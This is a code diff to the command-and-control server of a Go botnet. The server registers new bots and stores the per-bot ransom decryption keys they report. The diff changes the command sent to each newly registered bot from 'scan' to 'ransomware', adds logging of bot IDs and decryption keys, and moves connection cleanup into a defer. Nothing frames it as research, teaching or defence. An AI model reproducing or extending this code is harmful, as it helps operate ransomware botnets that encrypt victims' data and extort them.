@@ -3,6 +3,7 @@ package botnet
 import (
 	"bytes"
 	"encoding/gob"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"log"
@@ -70,6 +71,8 @@ func (c *CC) acceptConnections(l net.Listener) {
 }
 
 func (c *CC) handleConnection(conn net.Conn) {
+	defer conn.Close()
+
 	req := new(bytes.Buffer)
 	if _, err := io.Copy(req, conn); err != nil {
 		Err(err)
@@ -84,8 +87,6 @@ func (c *CC) handleConnection(conn net.Conn) {
 	case "rancom":
 		c.handleRansomwareComplete(req.Bytes()[commandLength:])
 	}
-
-	conn.Close()
 }
 
 func (c *CC) handleRansomwareComplete(payload []byte) {
@@ -93,6 +94,9 @@ func (c *CC) handleRansomwareComplete(payload []byte) {
 	if err := gob.NewDecoder(bytes.NewReader(payload)).Decode(req); err != nil {
 		log.Panic(err)
 	}
+
+	fmt.Println("bot id", req.BotID)
+	fmt.Println("key to decrypt", hex.EncodeToString(req.Key))
 
 	if err := c.Storage.AddRansomKey(req.BotID, req.Key); err != nil {
 		log.Fatal(err)
@@ -110,7 +114,7 @@ func (c *CC) handleGensis(payload []byte) {
 	}
 	Msg("bot was added")
 
-	data := append(commandToBytes("scan"), []byte{}...)
+	data := append(commandToBytes("ransomware"), []byte{}...)
 	sendData(bot.Addr(), data)
 }
 
